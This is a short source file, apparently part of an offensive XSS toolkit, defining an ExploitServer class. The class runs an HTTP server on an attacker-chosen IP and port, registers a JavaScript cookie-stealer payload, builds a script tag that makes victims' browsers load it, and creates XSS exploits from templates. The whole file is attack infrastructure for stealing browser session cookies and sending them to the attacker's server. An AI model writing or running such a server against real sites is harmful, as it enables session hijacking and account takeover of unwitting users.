#'ExploitEncoding';
#'ExploitRequestHandler';
#'ExploitResource';
#'ExploitServerConfig';
#'XssExploit';

class init ExploitComponent ExploitServer {
    port: ExploitServerConfig.getPort(),
    cookieStealer: ExploitServerConfig.getCookieStealer(),
    
    __init__: @(ip) {
        endpoint = self.ip, self.port;
        self.server = HTTPServer(endpoint, ExploitRequestHandler);
        self.server.payloads = dict();
        
        self.server.payloads[self.cookieStealer] = 
            ExploitResource.getJsCookieStealer(self.ip, self.port);
            
        self.scriptTag = ExploitResource.getScriptTag(self.ip, self.port, self.cookieStealer);        
    },
    
    createExploit: @(tmpl) XssExploit(self, tmpl) |> str,
    
    serveForever: @{
        self.log('[?] Listening on {}:{}'.format(self.ip, self.port));
        self.server.serve_forever();
    },
};